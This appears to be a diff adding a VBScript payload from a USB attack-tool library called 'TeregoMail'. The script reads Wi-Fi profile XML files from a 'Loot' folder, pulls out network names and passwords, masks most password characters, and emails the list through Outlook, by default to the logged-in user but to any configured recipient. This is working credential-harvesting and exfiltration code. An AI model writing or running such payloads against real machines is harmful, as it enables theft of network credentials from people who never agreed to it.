@@ -1,0 +1,95 @@
+
+strDirTemplates = "\payloads\library\TeregoMail\Templates"   ' -- The relative path to the template html email body (driveletter will be added)
+
+intShowChars = 2                                     ' -- Shows x character of the password in plain text, the others will be a *
+
+strTo        = ""                                    ' -- The mail recepient. If left blank, the mail will be send to the user that is logged in
+strCC        = ""                                    ' -- The mail cc recepient
+strBCC       = ""                                    ' -- The mail bcc recepient
+
+
+
+'------- Get Bash Drive Letter ---
+    strScriptFullPath = WScript.ScriptFullName
+    strBashDrive = Left(strScriptFullPath, 2)
+
+'------ Define mailTemplate ---
+    strLanguage = WScript.Arguments.Item(0)
+    if strLanguage="" then strLanguage = "EN"
+    strTemplateFile = strDirTemplates & "\MailTemplate_" & strLanguage & ".html"
+    strTemplateFile = strBashDrive & strTemplateFile
+    strTemplateFile = Replace(strTemplateFile,"""","")
+
+'----- Calculate lootdir and template file ---
+    if WScript.Arguments.Item(1)<>"" Then
+      strDirLoot = WScript.Arguments.Item(1)
+    else
+      strDirLoot = strBashDrive & "\payloads\library\TeregoMail\Loot" 
+    end if
+    strDirLoot = Replace(strDirLoot,"""","")
+
+'----- Get Passwords ---
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    strFolderPath = dirLoot
+    strOutput = ""
+    Set objMap = objFSO.GetFolder(strDirLoot)
+    For Each objFile1 In objMap.Files
+        If LCase(objFSO.GetExtensionName(objFile1.Name)) = "xml" Then
+            WScript.Echo "- " & objFile1.Name
+            SSIDpart = vbFalse
+            Set objFile = objFSO.OpenTextFile(objFile1.Path, 1) 
+            Do Until objFile.AtEndOfStream
+              strLine = objFile.ReadLine
+              if inStr(strLine,"<SSID>")>0 Then SSIDpart = vbTrue
+              if inStr(strLine,"</SSID>")>0 Then SSIDpart = vbfalse
+
+              if SSIDpart Then
+                if inStr(strLine,"<name>")>0 Then
+                   ftemp=Split(Replace(strLine,">","<"),"<")
+                   strName = fTemp(2)
+                end if
+              End If
+              strPass2 = "unknown"
+              if inStr(strLine,"<keyMaterial>")>0 Then
+                 ftemp=Split(Replace(strLine,">","<"),"<")
+                 strPass = fTemp(2)
+                 strPass2 = Left(strPass,intShowChars) & Right("*******************************",Len(strPass)-intShowChars)
+                 strOutput = strOutput & vbCRLF & strName & vbTab & strPass2
+              end if
+            Loop
+        End If
+     Next
+     WScript.Echo "-------------------------------------------------------"
+     WScript.Echo strOutput
+
+'----- Get Outlook Email Adres if recepient not given ---
+   if strTo="" Then
+     Set objOutlook = CreateObject("Outlook.Application")
+     Set objNamespace = objOutlook.GetNamespace("MAPI")
+     Set objAccount = objNamespace.Session.Accounts.Item(1) 
+     strEmail = objAccount.SmtpAddress
+   else
+     strEmail = strTo
+   end if
+
+'------ Build Email body + Subject----
+    strOutput = "<table><tr><td>" & Replace(strOutput,vbCRLF,"</td></tr><tr><td>") & "</td></tr></table>"
+    strOutput = Replace(strOutput,vbTab,"</td><td width=""30""></td><td>")
+    Set objFile = objFSO.OpenTextFile(strTemplateFile, 1)
+    strHTMLBody = objFile.ReadAll
+    arrTemp = Split(strHTMLBody & [MailSubject],"[MailSubject]")
+    strSubject = ArrTemp(1)
+    strHTMLBody = Replace(strHTMLBody,"[[OUTPUT]]",strOutput)
+
+ '----- Send Passwords ----
+' Maak een verwijzing naar het Outlook.Application-object
+Set objOutlook = CreateObject("Outlook.Application")
+Set objEmail = objOutlook.CreateItem(0) 
+objEmail.Subject = strSubject
+objEmail.HTMLBody = strHTMLBody
+objEmail.CC  = strCC
+objEmail.BCC = strBCC
+objEmail.To  = strEmail
+objEmail.Send
+Set objEmail = Nothing
+Set objOutlook = Nothing
